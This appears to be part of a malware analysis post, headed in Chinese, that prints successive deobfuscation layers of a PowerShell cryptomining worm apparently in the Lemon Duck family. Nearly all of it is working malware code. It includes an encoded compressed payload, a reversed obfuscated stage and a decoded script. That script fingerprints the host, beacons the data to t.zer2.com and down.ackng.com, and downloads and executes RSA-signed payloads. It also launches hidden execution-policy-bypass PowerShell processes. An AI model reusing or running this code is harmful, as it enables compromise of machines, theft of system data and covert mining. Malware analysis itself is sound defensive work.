xzTM2JvWAqb9jZ5a4YMlcYFRHI6qhgltKzv6WuIn3OC8mmRc4eOLd3bFZLkzrapGRJ70oWkPYN78/6PoJPlqtzYcvv+IPDfm122efySR88vufg1zfR9DIzZ998QuDwJ4aaK7Ha3PGr3JsqfDYw/1dXZMvnnETeL8CSOFNuw3PpGFbLMzk5ytFCDP6CZOURsGtZnWmWYJnnz2lz09kvJfgj3omaMqXgmCRwS/nKcBrH3NG87MX9PPs+IsvpRHpBkurV6evv1J0JuazN2dP+KOmcrk3fAGBff0l/cvfToUb8cIJfXb8xS+Uzj6ZFesLi/LZV07r08/Pdbqy5e9PIRmPTLpAG3mhZBGzgsJsQLISjfkpEaoYZsyxz5YVqbpXAKFsrPTbIpDESUIVklAjQyJzCgNIhCLWlTvMKIueL3fMZyxyCoclDfPiCR39OfmBfh+K4SMhG2d4gUFPEPl7TxYffvopfQRxpB8qkU4cu7JoBZEae7KIKMjKoQqhmIDfHdSjnilh+xURnIzcdpt/TvTzhc8lUqg1Bd4gPeKLO7/k+zvfu3NHcajaMXx84tb6qRMIhO5KifWWTv9PuuTZ7w8OARTikhcc5m+ZCD+lntJfAoP5bO/em+NnwPQXYVzbijD3JO+kdSUs8frZmxfc0G+lbG0ab0lGnSHrd2/r6orMl3nTjqMDPS8n2WUFScaEywB5kUNe/JhzRuG71Bl9zP3t7+3A99jGAuzqdZ7XDK8ssstj7YfxukbaoTnjj35xmpsUfT6/YorcofQEwNM0kWxU58sz6c1kkRoSlM9SfCamjnpHvM7x+B1JtBEjuiQEJ7e89OcbHa6k/iJNpc1nqWhWfTH5jW2aI9aemxeMj0qbyC+b8VVRT9nle0qf6bd3sHjAX+RPU3BknZdlxcnlZXVCcl/85O+/d29ZfJf7SKfF4rtb8BoEG3YegCMrBMwTeLiZUWBNiUuYP6Gul0uCM3jydlq8QUBOK65LWhsxnLPMv7fVWOVDMCBORVkWX2gEv8xWLCsI2c10CXfgV2OuQKNsQX7jHZmoWjLgUx7IlXrQNBBYShoy8OcXZB5Pvzh+Af0NDWKWvOB1qn5PfmNIERFwmyW6KFcNMVq9JqhtMZ/Wx6+/1H5fg0wZmaEvlYKuY/SKbsk8GOVJ80CI/uTQu5SYKqcI630Q0OgVv70Lv69taGFc21TbWEvOG2ZlXcufZl+M7/ySfF1D16Q/cUp6HIKxzFeFFQLD/WCLrF5fFOfEBkTAVTY7FuFVYr8QxKhbdEg/PLzw4WepmLLkNyZr9dXYpLHaKcVH+nv9UsbK80PvUDbRp1RVLK4I3MWWJM3VAJoJevOVQnn5xZf624kRBxJLsoX0kjGH1pnc1YVK+ELJb7yXW1zch87iGGVMK4ac/daP4Xh8/zyvv4fQQhOv1Jc2eo5gI5tU5eeShIX6QhiiZKdltXb9BbnQBWmfev7Gd+SpqTjxh5RLKhEKfKZA0SV8eOR/sdb6sazpM7L0OyGKTxhX9wLhSJ8ateZj62OqX5ucnsU7QFq/7OHeDUkd4oqGcLdBfU+pz3hb6kpms0tc/dvDWto5+po3uuiqarKkhioTatNvbziOFZ3Ri6gP9V07Cpd0NUMwDISo9YtndUVCQi74sljMjqEPKIddvVqetWWxftKQn0DMPC4ppTwly/2ym9/83pa0JhtExp2UYV2vT8TcyMo/fTQ7c2D0dYGmf7wcw+fg1n7O9Hv0wfelY3wFPnjZx8chQiIDMMVCvGaCsLX1MamorWV11jSn9ct3+Xb+e31J6c70o/Twe8evXmXX33/06FV+eVo3p1u/2/qnr9M76WE63kp/t1Uz/3KRf2//+5/8bi9fz7/8Iv/evZ3vUwrl4ztb6fZ3qmIprcn9TP4f')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

* 第五次解密
```
$UjY= [chAR[ ]]") )93]rahC[,)501]rahC[+611]rahC[+68]rahC[(ECAlPEr-63]rahC[,)68]rahC[+08]rahC[+66]rahC[(ecalPeRc- 421]rahC[,)101]rahC[+89]rahC[+66]rahC[(ecalPeRc-)'

)itVitVNioJ-itVXitV+]3,1[)(GNIRtsoT.EcnErefErpeSObRevVPB ( .ebB)93]RAhC['+',itVlMwitV  EcALpEr-  29]RAhC[,'+'itVbzWitV ecaLPERc- 4'+'21]'+'RAhC[,)18]RA'+'hC[+011]RAhC[+511]RAhC[(  EcALpEr- 63]'+'RAhC[,)65]RAhC[+501]RA'+'hC[+711]RAhC[( EcALpEr-  43]RAhC[,itVlMFitV '+'
ecaLPERc-)i'+'tV
35=troptcennoc 1.1.1.1=sserddatcennoc'+' 92556=t'+'ropnetsil 4vot4v dda yx'+'orptrop '+'ecitV+itVafretni exe.hsten
SNDS 925itV+itV56 pct itV+i'+'tVgninitV+itVepotrop dda l'+'lawerif exe.hsten c/ exe.dmc

lru_eroc8iu XEISitV+itV

}{hctac}
}
lMFgra8iulMF tsiLtnemugrA- exe.dm'+'c htaPeliF- ssecorP-tratS		
lMwlMF])'+'tnuoc.noc8iu(..)1+i8iu([noc8iu sitV+itVetyBEP- RLSAecroF- noitcejnIEPevitcelfeR-ek'+'ov'+'nI;)]i8iu..0[noc8iu]][rahc'+'[nioj-(xei;}}kaerb{)a0x0 qe- ]i8iu[no'+'c8iu(fi{)1=+i8iu;1-tnuoc.noc8iu tl- i8iu;0=i8iu(rof;itV+itV})noc8iu,pm8'+'iu(setyBllAeti'+'rW::]e
liF.OI.metsyS[;)lMwlMwlMw + smarap8iu + lMF?nib.a6m/lru_nwod8iulMF + lMwlMwlMw(ataddaolnwod.)tneilCbeW.'+'teN tc'+'ejbO-w'+'eN(=noc8iu{)noc8iu!(fi}}l'+'MwlMwlMwlMw=noc8iu{)lMw+lMFl'+'Mw5'+'dmm8iulMwlMF+lMwen'+'-s8iu(fi;})lMwlMw2XlMwlM'+'w(gnirtSoT._8iu=+s8iuitV+i'+'t
V{hcae'+'rofQns)noc8iu(hsaHetupmoC.)(etaerC::]5DM.yhpargotp'+'itV+itV'+'yrC.yt'+'iruceS.metsyS[;)pm8iu(setyBllAda'+'eR'+'::]eliF.OI.metsyS[=noc8itV+itViu{)pm8iu htap-t'+'set(filMw+lMF;lMwnib.a6mb'+'z'+'WlMwlMF+lMw+pmt:vne8i'+'tV+itViu=pm8iu;lMw+3edoc8iu+'+'lMwlitV+it
VMFlMw+'+'lMF '+'c- ssapyb pe- neddih w- pon- lleitV+it'+'Vhsrewo'+'p c/lMF = gra8iu		
lMFd34262aa2'+'b31f85ed'+'696e6268656de2elMF = 5dmm8i'+'u		
{)anitV+itVMl'+'acol8iu'+' dna- Asi8iu(fi
itV+itV}
lMFgra8iulMF tsiLtneitV+itV'+'m'+'ugrA- exe.dmc htaPeliF- ssecoritV+itVP-tratS		
'+'lMwlMF])tnuoc.no'+'c'+'8iu(..'+')1+i8iu([noc8iu setyB'+'EP- RLSAecroF- noitcejnIEPevitit'+'V+itVceitV+itVlfeR-ekov'+'nI;)]i8itV+itViu..0[noc8iu]][rahc[nioj-(xei;}}kaerb'+'{)a0x0 itV+itVqe- ]i8'+'iu[noc8iu(fi{'+')itV+'+'itV1=+i8iu;1-tnuoc.noc8iu tl'+'- i8iu;0=i8iu'
+'(rof;})noc8iu,pm8iu(sitV+itVe'+'tyBllAetirW::]eliF.OI.met'+'syS[;)lMwlMw'+'lMw + smarap'+'8iu '+'+ lMFitV+itV?}nibm{8iitV+itVu/'+'lru_nwod8iulMF + lMwlMwlMw(ataddaolnwod.)tneilCbeW.teN tcejbO-weN(=noc8iu{)noc8iu!(fi}}lMwlMwlMwlMw=noc8iu{)lMw+lMFlMw5dmm8iulMwlMF+lMw
en-s8iu(fi;})lMwlMw2XlMwl'+'itV+itVMw(gnirt'+'SoT._8iu=+s8iu{hcaerofQns)noc8iu(hsaHetupmoC.)(etae'+'rC::]5DM.yhpargotpyrC.'+'ytiru'+'ceS.metsyS[;)pm8iu'+'(setyBllAdaeR::]e'+'liF.OI.'+'metsyS[=nitV+itVoc8iu{itV+itV)pm8iu htap-itV+itVtset(filMw+lMitV+'+'itVF;lMwnibm8iu
bzWlMwlitV+itVMF+lMw+pmt:vne8iu=pm8iu;lMw+2eitV+itV'+'doc8iu+lMwlMFlitV+itVMw+lMF itV+it'+'Vc- ssapyb '+'pe- neddih w- pon- '+'llehsrewo'+'p c/lMF = gra8iu		
}itV+itV		
'+'lMFd1ee3b58b75fe578a487bee098ed27e9lMF ='+' 5dmm8i'+'u			
lMFnib.3mlMF = nibm8iu			
{esle}		
itV+'+'itVlMF3d'+'07daf6cba33cadd23c307f878ae84alMF = 5dmm8iu			
lMFnib.6mlMF '+'= nibm8iu			
{)8 qe- eziS::]rtPtnI[(fi		
{)nMlacol8iu('+'fi
{yrt
'+'
}{hctac}
'+'itV+itV}
lMFgra8iulMF tsiLtnitV'+'+itVemugrA'+'- exe.dmc htaPeliF- ssecorP-tratS		
lMwlMF)noc8iu]][rahc[nioj-(XEI})noc8iu,pfi8iu(setyBllAetirW::]eliF.OI.metsyitV+itVS[;)lMw'+'lMwlMw + smarap8iu + lMF?nib.fi/lru_nwod8iulMF + lMwlMwlMw(atad'+'daoitV+itVlnwod.)tneilCitV+itVbeW.teN tcitV+itVejbO-itV+itVweN(=noc8iu{)noc8i'+'u!(fi}}lMwlMwlitV+itVMwlMw=no
citV+'+'itV8iu{)lMw+lMFlMw5dmfi8iulMwlMF+itV+itVl'+'Mwen-s8iu(fi;})lMwlMw2XlMwlMw(gnirtSoT._8iu=+s8iu{hcaerofQns)noc8iu(hsaHe'+'itV+itVtupmoC.)(etaerC::]5DM.yhpargotpyrC.ytiruceS.'+'m'+'etsyS[;)pfi8iu(setyBllAdaeR::]eliF.Oit'+'V+itVI.metsyS[=noc8iu{)pfi8iu h'+'tap-ts
et(fi;lMwlMwnib.fibzWlMwlMw+pmt:vne8iu=pfi8iul'+'Mw+l'+'MwlMFlMw + lMF '+'c-'+' ssapitV+itVyitV+itVb pe- n'+'eddih w- po'+'n-'+' llehsrewop c/lMF = gitV+itVra8iu		
lMF36cb0c32c2d49b598c81b0ed2b0'+'2ccbalMF=5dm'+'fi8iu		
{'+')itV+itVfIlacol8iu(fi
itV+itV{yrt

}
}{hctac }	'+'
}		
}			
)se'+'tyb_witV+itVar8iu]][rahc[nioj-( XEI				
'+'{ ))yarrAetyb8iu,1ahs8iu,setybitV+itV_war8iu(ataDy'+'fir'+'ev.asr8iu(fi			
redivorPeciv'+'reSotpyrC1AHS.yhpargotpyrC.itV+itVytiruceSitV+itV.metsyS tcejbO-weN = 1ahs8iitV+itVu			
)46esab8iu(g'+'nirtS46esaBmorF::]trei'+'tV+itV'+'vnoc'+'[ = yarrAetyb8iu			
)setyb_itV+it'+'Vngis8iu]][rahc[(itV+itVnioj- = 46esab8iu			
'+')smaraPasr8iu(sretemaraitV+itVPtropmI.asr8iu			
;redivorPitV+itVecivre'+'SotpyrCASR.yhpargotpyrC.ytiruceS.metsyS e'+'maNepyT- tcitV+itVejbO-weN = asr8iu			
'+'10x0,00x0,10x0 = tnenopxE.smaraPasr8iu			'+'
d5x0,b6x0,74x0,7bx0,83x0,aex0,79x0'+',eax0,b7x0,4ax0,36x0,88x0,7fx0,'+'5dx0,36x0,dfitV+itVx0,27x0,01x0,59x0,e2x0,6fx0,f3x0'+',79x0,bdx0,89x0,a0x0,bcx'+'0,03x0,e6x0,93x0,fcx0,0dx0,24x0,e8x0,59x0,eax0,a6x0,19x0itV+itV,7ax0,04x0,97x0,dcx0,21x0,2ex0,itV+itVf'+'9x0,7ax0it
V+itV,a8x0'+','+'87x0,43x0,7cx0,7ex0,dcx0,10x0,25x0,6cx0,37x0,03x0,91x0,1dx0,b2x0,d7x0,b9x0,e2x0,8bx0,c6x0,itV+itVeex0,29'+'x0,2fx0,53x0'+',fbx0,88x0,cdx0,06itV+itVx0,1dx0,11x0,6fx'+'0,f4x0,6ax0,dbx0,edx0,ac'+'x0,e'+'6x0itV+itV,69x0,70x0,68x0'+',0'+'7x0,26x0itV+itV,b
3x0'+',f4x0'+',3fx0,b6x0,73x0,dcx0,dcx0,'+'0cx0,d3x0,25x0,c3x0,32x0,e4x0,eax0,6dx0,76x0,bex0,55x0,b7x0,itV+itVc6x0,e6x0,37xitV+itV0,a9x0,35x0,37x0,ffx0,f2x0,ffitV+itVx0,itV+itV28xitV+itV0,d9x0,'+'99x0,eitV+itV5x0,14x0,d6x0,cbx0,79'+'x0,bbx0,7'+'dx0,8ax0,56x0,itV+itVa
dx0 = suludoM.s'+'maraPasr8iu			
sretitV+itVemaitV+itVraPASR.itV+itVyhpargot'+'pyrC.'+'ytiruceS.metsyS tcejbO-weN = smarit'+'V+itVaPasr8iu			itV+'+'itV
;]tnuoc.setyb_ser8iu..371[s'+'etyb_ser8iu '+'= setyb_war8iu			
;]171..itV+itV0[setyb_ser8iu = setyb_ngis8iu		'+'
{)371 tg'+'- tnuoc.sitV+itVetyb_ser8iu(fi		
)lrulanif8iu(ataDdaolitV+itVnwoD.tneilcbew8iu = setyb_ser8iu		
}{hctac }itV+itV		
))lMw-lMw,lMwbzWlMw(itV+itVecalper.kcuD_nomeitV+itVL8iu+lMF-kcuD-no'+'meLlMF,lMFtnegA-resUlMF(dda.sredaeH.tneilcbew8iu	'+'		
{yr'+'t		
lMFsmarap8iulMF+lMF?lMF+lMFlru8iulMF = lrulanif8iu'+'		'+'
tneilCitV+i'+'tVbeW'+'.teN.metsyS tcejitV+itVbO-weN '+'= tneilcbew8iu		
{yrt
)
itV+itVlru8iu]gnirts[
(maraP
'+'  { XEIS noi'+'tcnuf

lMFmoc.gnkca.nitV+itVwod//:ptthlMF = lru_nwod8iu
lMFpsitV+itVj.troper/moc.2rez.t//:ptthlMF = lru_'+'eroc8iu
itV+itV
}

}'+'
arh8iu+lMF=ARH&lMF=+smarap8iu		
)(miitV+itVrt.]3[sehc'+'tam8i'+'u+)(mirt.]2[sehctam8iu+)(mirt.]1'+'[sehctam8iu=arh8iu		
{)lMwnbzW)+.(nbzW)+.(nbzW)+.(nbzW[bzW itV+itV:lMFlatotlMFlMw hctam- )lMwyrammus/1/86634:1.0.0.72'+'1//:ptthlM'+'w(gnirtsdaolnwod'+'.)tneilcbew.ten.metsitV+itVys tcejbo-'+'wen((fi
3ed'+'oc8iu XEI
'+'{)Asi8iu(fi

pmatsemit8iu+lMF=T_&lMF+emitpu8iu+lMF=PU&lMF+rh8iu+lMitV+itVF=RH&lMF+_fm8iu]tnI[+lMF=FM&lMitV+'+'itVF+_fi8iu'+']tnI[+lMF=FI&lMF+nMlacitV+itVol8iu!]tnI[+lMF=MF&lMF+fIla'+'itV+'+'itVcol8iu!]tnI[+lMF=IF&lMF+timitV+itVrep8iu]tnI'+'[+lM'+'F=P&lMF+drac8iu+lMF=D'+'C&lMF+evi
'+'rd8iu'+'+lMF=D&lMF+niam'+'od'+'8iu+'+'lMF=N'+'IAMOD&lMF+resu8iu+lMF=RESU&lMF+tib8iu+lMF=TIB&lMF+so8itV+itViu+lMF'+'=SO'+'&lMF+cam8iu+lMF=C'+'AM&'+'lMF+diug8iu+lMF=DIUit'+'V+itV'+'G&lMF+eman_pmoc8iu+itV+it'+'VlMF=DIlMF = smarap8iu
'+'
)8 qe- eziS::]rtPtnI[( dnitV+itVa- )lMFnoedaRlMF hctam- drac8iu( = Asi'+'8iu
})(mirt.]3[sehcitV+itVt'+'am8iu+)(mirt.]2[sehctam8iu+)(m'+'irt.]1[sehctam8iu=rh8iu{)lMwitV+itVnbzW)'+'+.(nbzW)+.(n'+'bzitV+itVW)+.(nbzW[bzW :'+'lMFl'+'at'+'otlMFlMw hctam- )'+'lMwyrammus/1/966'+'34:1'+'.0.0.721//:ptthlMw(gnirtsdaolnwod.)tneilcb'+'ew.ten.metsy'+'s tce
jbo-wen((fi
lMFs%lMF tamroFU- etaD-teG = pmatsemit8iu
}{hctac}lMFQnslMFnioj-)}]0[))(gnirtsot.epyTevirDitV+'+'itV._8iitV+itVu(+itV+itVlitV+itVMF_lMF+]0[)emaN._8iu({hcaerof Qns }))lMF23TAFlMF q'+'e- tamroFevirD._8iu( ro- )lMFSFTNlMF qe- tamroFevitV+itVirD._8iu(( dna- ))lMFitV+itVkrowteNlMF qe- epyTevirD._8iu( ro- )lMFelba
vomitV'+'+'+'itVeR'+'lMF qe'+'- epyTevirD._8iu(( d'+'na- )4201 tg- ecapSeerFelbaliavA._8iu( dna- ydaeRsI._8iu{ eritV+itVehw Qns )(sevirDteG::]ofnIevirD.OI.metsys[( = evird8iu
'+'{'+'yrt
)nib.6mbzWpmt:vne8iu htaP-itV+itVtseT( ro- )nib.3mbzWpmt:vne8iu htaP-tseT( = _fm8iuitV+itV
nib.fibzWpmt:vne8iu htaP-tseT = _fi8iu
)(mirt.)lMFnoi'+'tpircs'+'eDlMF(mirt.))noitpircseD teG rellort'+'noCoediV_23niW htaP cimW(]gnitV+itVirts[( = drac8'+'iu
}sdnoceslatot._8iu{hcaerofQns)tnuoCkciT::]tnemnorivitV+itVne[(sdnitV+itVoce'+'silliMmorF::]napsemit[ = itV+itVe'+'itV+itVmitpu8iu
niamoD.)metsysretupmoc_23niw tcejbOimW-'+'teG( = niamod8iu
EMANRESU:'+'vne8i'+'u = resu8iu
]0[)lMF-lMF tilps- erutcetihcrASO.)metsySgnitarepO_23niW tcejbOimW-teG(( = tib'+'8iu
noisreV.)metsySgnitarepO_23niW ssalc- tcejbOimW-teG( = so8iu
1 '+'tsrif- tcejbo-tceles Qns sserddacaM.)}eurt8iu QE- delbanepi._8iu{ erehw Qns noitarugifnoCretpadAkrowteitV+itVN_23niW'+' tce'+'jbOimW-teG('+' = cam8iu
DIUU.)itV+itVtcudoitV+itVrPmetsySretup'+'moC_23niW tcejboimw-teg( ='+' diug8iu
EMANRETUitV+itVPMOitV+itVC:vne8iu = eman'+'_pmoc8iu
itV+itV1edoc8iu XEI
2edoitV+itVc8iu XEI
lMwitV+itV}{hctac})anMlacoitV+itVl8iu]fer[,lMw+lMFlMw'+'anMlacoLbzWlabolGlMwlMF'+'+lMw,eurt8iu(xetuM.gnidaerhT.metsyS tcej'+'bO-weN;esalf8iu=anMlacol8iu{yrtlMw=3edo'+'c8iu
lMw'+'}{h'+'ctac})nMlacol8iu]fe'+'ritV+itV[,lMw+lMFlMwnMlacoLbzWlaitV+itVbitV+itVolGlMwlMF+lMw,eurt8iu(itV+itVxetuM.gnidaerhT.metsyS tcejbO-weN;esalf8iu=nMlacol'+'8iu{yrtlMw=2edoc8iu
lMw}{hctac})fIlacoitV+itVl8iu]fer[itV+itV,lMw+lMFlMwfIlacoLbzWlabolGitV+itVlMwlMF+lMw,eurt8itV+itViu(xetuM.g'+'nidaerh'+'T.itV+'+'itVmetsyS tcejbO-weN;itV+itVesalf8iu=fIlacol8iu{yrtlMw=1edoc8iu
)lMFrotartsinimdAlMF ]eloRnItliuBswodniW.lapicnirP.itV+itVytiruceS[(eloRnIsI.))(tnerruCteG::]yt'+'itnedIswodniW.laitV+itVpicniritV+itVP.y'+'t'+'iruceSitV+itV['+']lapicn'+'i'+'rPswodniW.lapicnirP.ytiruceS[( = '+'timrep8iuitV(('(( (noIssErPxe-eKOVni " ;
[ARRay]::RevErsE($ujy ) ; .( $pshOme[4]+$PShOMe[30]+'x')( -Join$ujy )
```

* 第六次解密
```
inVOKe-exPrEssIon( (('((Vtiui8permit'+' = ([Security.Principal.WindowsPr'+'i'+'ncipal]'+'[Vti+VtiSecuri'+'t'+'y.PVti+VtirincipVti+Vtial.WindowsIdenti'+'ty]::GetCurrent()).IsInRole([SecurityVti+Vti.Principal.WindowsBuiltInRole] FMlAdministratorFMl)
ui8code1=wMltry{ui8localIf=ui8flaseVti+Vti;New-Object SystemVti'+'+Vti.T'+'hreadin'+'g.Mutex(uiVti+Vti8true,wMl+FMlwMlVti+VtiGlobalWzbLocalIfwMlFMl+wMl,Vti+Vti[ref]ui8lVti+VtiocalIf)}catch{}wMl
ui8code2=wMltry{ui8'+'localMn=ui8flase;New-Object System.Threading.MutexVti+Vti(ui8true,wMl+FMlwMlGloVti+VtibVti+VtialWzbLocalMnwMlFMl+wMl,[Vti+Vtir'+'ef]ui8localMn)}catc'+'h{}'+'wMl
ui8c'+'ode3=wMltry{ui8localMna=ui8flase;New-Ob'+'ject System.Threading.Mutex(ui8true,wMl+'+'FMlwMlGlobalWzbLocalMna'+'wMlFMl+wMl,[ref]ui8lVti+VtiocalMna)}catch{}Vti+VtiwMl
IEX ui8cVti+Vtiode2
IEX ui8code1Vti+Vti
ui8comp_'+'name = ui8env:CVti+VtiOMPVti+VtiUTERNAME
ui8guid '+'= (get-wmiobject Win32_Com'+'puterSystemPrVti+VtioductVti+Vti).UUID
ui8mac = '+'(Get-WmiObj'+'ect '+'Win32_NVti+VtietworkAdapterConfiguration snQ where {ui8_.ipenabled -EQ ui8true}).Macaddress snQ select-object -first'+' 1
ui8os = (Get-WmiObject -class Win32_OperatingSystem).Version
ui8'+'bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split FMl-FMl)[0]
ui8user = u'+'i8env'+':USERNAME
ui8domain = (Get'+'-WmiObject win32_computersystem).Domain
ui8uptimVti+Vti'+'eVti+Vti = [timespan]::FromMillis'+'ecoVti+Vtinds([enVti+Vtivironment]::TickCount)snQforeach{ui8_.totalseconds}
ui'+'8card = ([striVti+Vting](Wmic Path Win32_VideoCon'+'troller Get Description)).trim(FMlDe'+'script'+'ionFMl).trim()
ui8if_ = Test-Path ui8env:tmpWzbif.bin
Vti+Vtiui8mf_ = (Test-Path ui8env:tmpWzbm3.bin) -or (TestVti+Vti-Path ui8env:tmpWzbm6.bin)
try'+'{'+'
ui8drive = ([system.IO.DriveInfo]::GetDrives() snQ wheVti+Vtire {ui8_.IsReady -and (ui8_.AvailableFreeSpace -gt 1024) -an'+'d ((ui8_.DriveType -'+'eq FMl'+'ReVti'+'+'+'Vtimov
ableFMl) -or (ui8_.DriveType -eq FMlNetworkVti+VtiFMl)) -and ((ui8_.DriVti+VtiveFormat -eq FMlNTFSFMl) -or (ui8_.DriveFormat -e'+'q FMlFAT32FMl))} snQ foreach{(ui8_.Name)[0]+FMl_FMVti+VtilVti+Vti+(uVti+Vtii8_.Vti'+'+VtiDriveType.tostring())[0]})-joinFMlsnQFMl}catch{}
ui8timestamp = Get-Date -UFormat FMl%sFMl
if((new-obj
ect s'+'ystem.net.we'+'bclient).downloadstring(wMlhttp://127.0.0.'+'1:43'+'669/1/summarywMl'+') -match wMlFMlto'+'ta'+'lFMl'+': Wzb[Wzbn(.+)WVti+Vtizb'+'n(.+)Wzbn(.+'+')WzbnVti+VtiwMl){ui8hr=ui8matches[1].tri'+'m()+ui8matches[2].trim()+ui8ma'+'tVti+Vtiches[3].trim()}
ui8'+'isA = (ui8card -match FMlRadeonFMl) -aVti+Vtind ([IntPtr]::Size -eq 8)
'+'
ui8params = FMlID=FMlV'+'ti+Vti+ui8comp_name+FMl&G'+'Vti+V'+'tiUID=FMl+ui8guid+FMl'+'&MA'+'C=FMl+ui8mac+FMl&'+'OS='+'FMl+uiVti+Vti8os+FMl&BIT=FMl+ui8bit+FMl&USER=FMl+ui8user+FMl&DOMAI'+'N=FMl'+'+ui8'+'do'+'main+FMl&D=FMl+'+'ui8dr'+'
ive+FMl&C'+'D=FMl+ui8card+FMl&P=F'+'Ml+['+'Int]ui8perVti+Vtimit+FMl&FI=FMl+[Int]!ui8locVti'+'+Vti'+'alIf+FMl&FM=FMl+[Int]!ui8loVti+VticalMn+FMl&IF=FMl+[Int]'+'ui8if_+FVti'+'+VtiMl&MF=FMl+[Int]ui8mf_+FMl&HR=FVti+VtiMl+ui8hr+FMl&UP=FMl+ui8uptime+FMl&_T=FMl+ui8timestamp

if(ui8isA){'+'
	IEX ui8co'+'de3
	if((new'+'-object syVti+Vtistem.net.webclient).'+'downloadstring(w'+'Mlhttp://1'+'27.0.0.1:43668/1/summarywMl) -match wMlFMltotalFMl:Vti+Vti Wzb[Wzbn(.+)Wzbn(.+)Wzbn(.+)WzbnwMl){
		ui8hra=ui8matches['+'1].trim()+ui8matches[2].trim()+u'+'i8mat'+'ches[3].trVti+Vtiim()
		ui8params+=FMl&HRA=FMl+ui8hra
	'+'}

}
Vti+Vti
ui8core'+'_url = FMlhttp://t.zer2.com/report.jVti+VtispFMl
ui8down_url = FMlhttp://dowVti+Vtin.ackng.comFMl

funct'+'ion SIEX {  '+'
	Param(
	[string]ui8urlVti+Vti
	)
	try{
		ui8webclient ='+' New-ObVti+Vtiject System.Net.'+'WebVt'+'i+VtiClient
'+'		'+'ui8finalurl = FMlui8urlFMl+FMl?FMl+FMlui8paramsFMl
		t'+'ry{
		'+'	ui8webclient.Headers.add(FMlUser-AgentFMl,FMlLem'+'on-Duck-FMl+ui8LVti+Vtiemon_Duck.replaceVti+Vti(wMlWzbwMl,wMl-wMl))
		Vti+Vti} catch{}
		ui8res_bytes = ui8webclient.DownVti+VtiloadData(ui8finalurl)
		if(ui8res_byteVti+Vtis.count -'+'gt 173){
	'+'		ui8sign_bytes = ui8res_bytes[0Vti+Vti..171];
			ui8raw_bytes ='+' ui8res_byte'+'s[173..ui8res_bytes.count];
Vti'+'+Vti			ui8rsaPaVti+V'+'tirams = New-Object System.Security'+'.Cryp'+'tographyVti+Vti.RSAParVti+VtiameVti+Vtiters
			ui8rsaParam'+'s.Modulus = 0xd
aVti+Vti,0x65,0xa8,0xd'+'7,0xbb,0x'+'97,0xbc,0x6d,0x41,0x5Vti+Vtie,0x99'+',0x9d,0Vti+Vtix82Vti+Vti,0xVti+Vtiff,0x2f,0xff,0x73,0x53,0x9a,0Vti+Vtix73,0x6e,0x6cVti+Vti,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0'+',0xcd,0xcd,0x37,0x6b,0xf3,'+'0x4f,'+'0x3
b,Vti+Vti0x62,0x7'+'0,'+'0x86,0x07,0x96,Vti+Vti0x6'+'e,0x'+'ca,0xde,0xbd,0xa6,0x4f,0'+'xf6,0x11,0xd1,0xVti+Vti60,0xdc,0x88,0xbf,'+'0x35,0xf2,0x'+'92,0xeeVti+Vti,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78'+','+'0x8a,Vti+V
ti0xa7,0x9'+'fVti+Vti,0xe2,0x12,0xcd,0x79,0x40,0xa7,Vti+Vti0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0'+'xcb,0x0a,0x98,0xdb,0x97,'+'0x3f,0xf6,0x2e,0x95,0x10,0x72,0xVti+Vtifd,0x63,0xd5'+',0xf7,0x88,0x63,0xa4,0x7b,0xae,'+'0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d
'+'			ui8rsaParams.Exponent = 0x01,0x00,0x01'+'
			ui8rsa = New-ObjeVti+Vtict -TypeNam'+'e System.Security.Cryptography.RSACryptoS'+'erviceVti+VtiProvider;
			ui8rsa.ImportPVti+Vtiarameters(ui8rsaParams)'+'
			ui8base64 = -joinVti+Vti([char[]]ui8signV'+'ti+Vti_bytes)
			ui8byteArray = ['+'conv'+'Vti+Vt'+'iert]::FromBase64Strin'+'g(ui8base64)
			uVti+Vtii8sha1 = New-Object System.Vti+VtiSecurityVti+Vti.Cryptography.SHA1CryptoSer'+'viceProvider
			if(ui8rsa.ve'+'rif'+'yData(ui8raw_Vti+Vtibytes,ui8sha1,ui8byteArray)) {'+'
				IEX (-join[char[]]ui8raVti+Vtiw_byt'+'es)
			}
		}
'+'	} catch{}
}

try{Vti+Vti
	if(ui8localIfVti+Vti)'+'{
		ui8if'+'md5=FMlabcc2'+'0b2de0b18c895b94d2c23c0bc63FMl
		ui8arVti+Vtig = FMl/c powershell '+'-n'+'op -w hidde'+'n -ep bVti+VtiyVti+Vtipass '+'-c'+' FMl + wMlFMlwM'+'l+wM'+'lui8ifp=ui8env:tmp+wMlwMlWzbif.binwMlwMl;if(te
st-pat'+'h ui8ifp){ui8con=[System.IVti+V'+'tiO.File]::ReadAllBytes(ui8ifp);[Syste'+'m'+'.Security.Cryptography.MD5]::Create().ComputVti+Vti'+'eHash(ui8con)snQforeach{ui8s+=ui8_.ToString(wMlwMlX2wMlwMl)};if(ui8s-newM'+'lVti+Vti+FMlwMlui8ifmd5wMlFMl+wMl){ui8Vti'+'+Vtic
on=wMlwMVti+VtilwMlwMl}}if(!u'+'i8con){ui8con=(NewVti+Vti-ObjeVti+Vtict Net.WebVti+VtiClient).downlVti+Vtioad'+'data(wMlwMlwMl + FMlui8down_url/if.bin?FMl + ui8params + wMlwMl'+'wMl);[SVti+Vtiystem.IO.File]::WriteAllBytes(ui8ifp,ui8con)}IEX(-join[char[]]ui8con)FMlwMl
		Start-Process -FilePath cmd.exe -'+'ArgumeVti+'+'VtintList FMlui8argFMl
	}Vti+Vti'+'
}catch{}
'+'
try{
	if'+'(ui8localMn){
		if([IntPtr]::Size -eq 8){
			ui8mbin ='+' FMlm6.binFMl
			ui8mmd5 = FMla48ea878f703c32ddac33abc6fad70'+'d3FMlVti'+'+Vti
		}else{
			ui8mbin = FMlm3.binFMl
			u'+'i8mmd5 '+'= FMl9e72de890eeb784a875ef57b85b3ee1dFMl'+'
		Vti+Vti}
		ui8arg = FMl/c p'+'owershell'+' -nop -w hidden -ep'+' bypass -cV'+'ti+Vti FMl+wMVti+VtilFMlwMl+ui8cod'+'Vti+Vtie2+wMl;ui8mp=ui8env:tmp+wMl+FMVti+VtilwMlWzb
